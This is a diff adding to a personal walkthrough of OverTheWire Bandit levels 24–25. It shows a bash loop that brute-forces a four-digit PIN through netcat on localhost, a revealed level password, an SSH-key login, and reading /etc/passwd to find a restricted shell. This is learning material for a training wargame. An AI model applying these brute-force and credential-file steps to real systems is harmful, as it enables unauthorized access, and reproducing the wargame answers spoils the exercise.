@@ -597,4 +597,87 @@ There is no way to retrieve the pincode except by going through all of the 10000
 
 oooh so no guide to use which tools nice...
 lets try something
+so lets create a script which sends echo commands multiple times with netcat piping
+
+#! /bin/bash
+
+for i in for {0000...9999}; do
+        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done | nc 127.0.0.1 30002 
+
+but the thing is it stuck at first try
+tried sleep command but didn't work
+tried nc -q switch ... didn't work
+now instead of doing everything in one script lets break it
+first outputing the bruteforce keys to a file then output the keys to nc
+lets try
+
+#! /bin/bash
+
+for i in for {0000...9999}; do
+        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done
+
+./bruteforce.sh > bruteforce.txt
+
+tried stupidiest thing ever :P
+cat bruteforce.txt | nc localhost 30002
+
+slap on the head again!!!!
+
+bruteforce.txt is not the way I wanted :X
+the loop is not working X(
+lets correct it first
+
+#! /bin/bash
+
+for i in {0000..9999}; 
+do
+        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
+done
+
+:P
+now its fine
+nc localhost 30002 < bruteforce.txt now it worked and gave
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG which is passwd for bandit25 
+blooper (even cat bruteforce.txt | nc localhost 30002 worked which I thought is just a mistake) X{
+
+tools used to solve these levels
+ssh, cat, more, vi, ls, id, pwd
+
+Level 25:
+the goal says:
+Logging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how 
+it works and how to break out of it.
+
+so upon ls 
+found that there is a ssh key which is probably be for next level, so lets connect
+ssh -i bandit26.sshkey bandit26@localhost
+so we are in but it disconnected automatically
+tried piping ssh to vi, more but no work
+even tried with directly executing command but it got stuck
+tried everything but could not did it so I used lifeline and checked for answer 
+basically we have to check the shells they are running so 
+cat /etc/passwd | grep bandit26 -> gives shell info on bandit26
+bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
+cat /etc/passwd | grep bandit25 -> gives shell info on bandit25
+bandit25:x:11025:11025:bandit level 25:/home/bandit25:/bin/bash
+
+so bandit26 uses a script called showtest
+let us check whats inside 
+cat /usr/bin/showtext
+#!/bin/sh
+
+export TERM=linux
+
+more ~/text.txt
+exit 0
+
+ 
+
+
+
+
+
+
 
